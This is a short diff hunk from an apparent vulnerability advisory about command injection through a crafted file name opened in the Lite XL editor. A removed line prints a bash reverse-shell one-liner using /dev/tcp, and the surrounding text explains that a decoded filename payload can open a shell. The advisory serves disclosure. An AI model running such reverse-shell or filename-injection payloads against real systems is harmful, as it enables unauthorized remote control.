@@ -34,7 +34,7 @@ PoC:
 Create a file named  and open it in Lite XL — you should see hello.txt created. If you push this further you could get a reverse shell by using a filename that decodes and runs a payload; for example:
 
 
-That base64 decodes to `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`
+That base64 decodes to 
 
 ## References
 
